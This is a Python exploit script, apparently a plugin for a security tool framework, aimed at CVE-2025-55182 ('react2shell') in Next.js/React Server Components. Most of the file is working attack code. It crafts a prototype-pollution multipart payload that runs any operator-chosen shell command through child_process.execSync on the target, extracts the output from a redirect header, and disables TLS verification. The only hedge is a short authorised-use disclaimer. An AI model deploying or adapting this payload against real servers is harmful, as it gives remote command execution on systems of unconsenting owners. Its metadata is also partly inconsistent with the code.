AUTHER = "Perdo Team (VINE team)"
LICENSE = "Same as vine"
GITHUB_REPO = "https://github.com/viodex/403bypass"
IS_CVE_EXPLOIT = "yes,CVE-2025-55182" 
REQUIREMENTS = ["sys","time","haslib","re","urllib3","urllib","requests"]
VERSIONS =  ["v1.0","v1.1"]
DESCRIPTION = """

┌───────────────────────────────────────────────┐
│                 react2shell                   │
└───────────────────────────────────────────────┘

[+] Language      : Python (Standard)
[+] Version       : v1.0
[+] Type          : Web Security / Recon / Exploitation Tool
[+] Engine        : Async (httpx + asyncio)

───────────────────────────────────────────────

[+] Overview:

This tool is designed to test and demonstrate a potential
server-side vulnerability referred to as "react2shell",
which may occur in certain Next.js / React-based environments
where unsafe server-side execution or command handling exists.

The script sends crafted asynchronous HTTP requests to detect
and potentially exploit insecure command execution behavior.


resources : https://react2shell.com/
            https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/

───────────────────────────────────────────────

[+] Features:

1- Simple and easy-to-use interface
2- Supports script execution mode via CLI flags (--script / --GitTaw)
3- Async engine for faster requests handling
4- Lightweight and modular structure

───────────────────────────────────────────────

[+] Arguments:

- url                  → Target URL
- AdditionalArgument1  → Command or payload to execute remotely

Note:
Extra parameters such as IPs or secondary inputs can be passed using:
-AA1 / --AdditionalArgument1

───────────────────────────────────────────────

[+] Warning:

This tool is intended strictly for educational purposes and authorized security testing only.
Unauthorized use against systems you do not own or have explicit permission to test is strictly prohibited.

───────────────────────────────────────────────

[+] Author Note:

Always ensure you have proper authorization before testing any target.
Responsible disclosure and ethical usage are strongly encouraged.



"""

import argparse
import sys
import hashlib
import time
import re
from urllib.parse import unquote
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from EngineQLibs import *

class ExploitConfig:
    def __init__(self):
        self.target_url = ""
        self.payload_cmd = ""
        self.timeout = 15
        
    def normalize_url(self, url):
        if not re.match(r'^https?://', url):
            return f"https://{url}"
        return url

class BannerDisplay:
    
    

    
    @staticmethod
    def show_success(output):
        printv(f"{Style.BRIGHT}EXPLOITATION SUCCESSFUL\n\n","info")
        
        cleaned_output = output.replace(' | ', '\n')
        lines = cleaned_output.split('\n')
        printv("output came from the target : \n","task")
        print(("-" * 30)+f"{Style.BRIGHT}begin writing response from server{Style.NORMAL}"+ ("-"*30) + "\n")
        for line in lines:
            if line.strip():

                print( f"   {Style.BRIGHT}{line}")
        print(("-" * 31)+f"{Style.BRIGHT}end writing response from server{Style.NORMAL}"+ ("-"*31) + "\n")
    
    @staticmethod
    def show_failure(error_type, details=""):
        printv(f"EXPLOITATION FAILED","critical")
        
        error_map = {
            'forbidden': ('ACCESS DENIED', 'WAF/Firewall blocking detected'),
            'timeout': ('CONNECTION TIMEOUT', 'Target did not respond'),
            'ssl': ('SSL ERROR', 'Certificate validation failed - try HTTP'),
            'server_error': ('SERVER ERROR', 'Target rejected payload or not vulnerable'),
            'unknown': ('EXPLOITATION FAILED', 'Target may not be vulnerable')
        }
        
        title, msg = error_map.get(error_type, error_map['unknown'])


class PayloadGenerator:    
    @staticmethod
    def generate_hash(length=8):
        timestamp = str(time.time()).encode()
        return hashlib.sha256(timestamp).hexdigest()[:length]
    
    @staticmethod
    def sanitize_command(cmd):
        return cmd.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '')
    
    @staticmethod
    def build_exploit_payload(command):
        safe_cmd = PayloadGenerator.sanitize_command(command)
        injection = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
            f'"var res=process.mainModule.require(\'child_process\').execSync(\'{safe_cmd}\')'
            '.toString().trim().replace(/\\\\n/g, \' | \');;throw Object.assign(new Error(\'NEXT_REDIRECT\'),'
            '{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        # Multipart boundary
        boundary = "----HacxMeBoundaryX9K2pLvN4MqR8TdF"
        
        # Multipart body
        body_parts = [
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="0"\r\n\r\n',
            f'{injection}\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="1"\r\n\r\n',
            '"$@0"\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF\r\n",
            'Content-Disposition: form-data; name="2"\r\n\r\n',
            '[]\r\n',
            f"------HacxMeBoundaryX9K2pLvN4MqR8TdF--\r\n"
        ]
        
        return ''.join(body_parts), boundary

class ExploitEngine:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        
    def craft_headers(self, boundary):
        return {
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': PayloadGenerator.generate_hash(8),
            'X-Nextjs-Html-Request-Id': PayloadGenerator.generate_hash(20),
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
    
    def execute(self):
        printv(f"Initiating exploitation sequence...","task")
        payload_body, boundary = PayloadGenerator.build_exploit_payload(self.config.payload_cmd)
        headers = self.craft_headers(boundary)
        printv(f"Establishing connection to target...","task")
        
        try:
            response = self.session.post(
                self.config.target_url,
                data=payload_body,
                headers=headers,
                timeout=self.config.timeout,
                allow_redirects=False,
                verify=False
            )
            
            return self.parse_response(response)
            
        except requests.exceptions.Timeout:
            return False, 'timeout', 'Connection timeout after 15 seconds'
        except requests.exceptions.SSLError as e:
            return False, 'ssl', str(e)
        except requests.exceptions.RequestException as e:
            return False, 'unknown', str(e)
    
    def parse_response(self, response):
        redirect_header = response.headers.get('X-Action-Redirect', '')
        match = re.search(r'/login\?a=([^;]*)', redirect_header)
        
        if match:
            encoded_output = match.group(1)
            decoded_output = unquote(encoded_output)
            return True, 'success', decoded_output
        
        if response.status_code == 403:
            return False, 'forbidden', 'HTTP 403 Forbidden'
        elif response.status_code == 500:
            return False, 'server_error', 'HTTP 500 Internal Server Error'
        else:
            return False, 'unknown', f'HTTP {response.status_code}'



def run(args):
    printv("NOTE : EngineQ will be disabled and re-enabled after the script ends","info")
    Help().disableEngineQ()
    
    config = ExploitConfig()


    if args.url:
        config.target_url = config.normalize_url(args.url)

    if hasattr(args, "command") and args.AdditionalArgument1:
        config.payload_cmd = args.AdditionalArgument1

    if hasattr(args, "AdditionalArgument1") and args.AdditionalArgument1:
        config.payload_cmd = args.AdditionalArgument1


    engine = ExploitEngine(config)
    success, status, data = engine.execute()

    if success:
        BannerDisplay.show_success(data)
    else:
        BannerDisplay.show_failure(status, data)
